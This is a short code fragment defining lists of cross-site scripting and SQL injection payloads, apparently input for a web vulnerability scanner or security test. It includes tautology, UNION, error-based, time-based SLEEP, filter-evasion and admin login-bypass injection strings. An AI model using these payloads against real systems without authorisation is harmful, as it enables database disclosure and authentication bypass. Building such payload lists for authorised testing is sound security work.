XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>"
]

SQLI_PAYLOADS = [

    "' OR 1=1 -- ",
    '" OR "a"="a',
    "1 OR 1=1",  


    "' UNION SELECT 1,2,3-- ",
    "' AND 1=CONVERT(int, (SELECT @@version))-- ",


    "' OR 1234=SLEEP(5) -- ",


    "'%0AOR%0A1=1 -- ",
    "'/**/OR/**/1=1 -- ",
    "1'||(SELECT 1 FROM users WHERE 1=1)||'",


    "' UNION SELECT 'a',sqlite_version(),3 -- ",
    "admin'-- "
]
